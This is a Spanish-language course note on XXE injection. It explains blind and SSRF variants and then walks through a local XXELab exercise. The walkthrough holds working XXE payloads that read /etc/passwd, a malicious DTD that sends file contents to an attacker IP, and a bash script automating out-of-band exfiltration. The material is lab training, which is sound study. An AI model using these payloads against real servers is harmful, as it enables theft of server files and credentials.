
---- 
- Tags: #XML #INJECTION #XXE
----
Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:

- **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)
---
- Primero clonamos el repositorio 
```
$ git clone https://github.com/jbarone/xxelab.git
$ cd xxelab
$ docker build -t xxelab .
```

- Y corremos nuestro docker en segundo plano para evitar errores
```
docker run -dit --rm -p 127.0.0.1:5000:80 xxelab
```
- Abrimos nuestro navegador por el puerto localhost:5000
- Tambien abrimos nuestro burpsuite para ver donde viaja las direcciones al crear nuevo usuario
- Configuramos en el apartado de repetear debajo de ?xml
```
<!DOCTYPE foo [<!ENTITY myName "sk8ware">]>
``` 
- Y debajo del apartado **email** colocar 
```
&myName;
```
- Si observamos que todo funciona correctamente podemos proceder con el XXE INJECTION con el siguiente comando debajo de ?xml
```
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc//passwd">]>
```
- De bajo de email
```
&miFile;
```
- Con esto obtendriamos la Injección XXE
- Podriamos obtener mas información con mas gruapers, este nos muestra la información en base64
```
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
```

```
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.72.130/testXXE">]>
```
- Con este gruaper nos permite ver información desde nuestro servidor http con python 
```
python3 -m http.server 80
```
- Con esto recibimos las pediciones del servidor con burpsuite

- En caso que no nos permita enviar solicitudes con la entidad en la estructura lo podemos enviar en la misma línea 
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.72.130/malicious.dtd">]> %xxe;]>
```

- Creamos un archivo .dtd en nuestro sistema 
```
nvim malicious.dtd
```

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#X25; exfil SYSTEM 'http:///?file=%file;'>">
%eval;
%exfil;
```
- Ahora escuchamos por nuestro servidor con python 

- Tambien nos podemos crear el siguiente **xxe_oob.sh** nvim para obtener datos por consola
```
#!/bin/bash 

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename 

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.72.130/?file=%file;'>\">
%eval;
%exfil;"""

echo $malicious_dtd > malicious.dtd
 
python -m http.server 80 &>response &
 
PID=$!
 
sleep 1
 
curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.72.130:80/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>123</tel><email>a@a.com</email><password>test123</password></root>'
 
cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d
 
kill -9 $PID
wait $PID 2>/dev/null
 
rm response 2>/dev/null
```
- Con este script ya podriamos pedirle que nos enliste ciertos directorios como :
	/etc/passwd
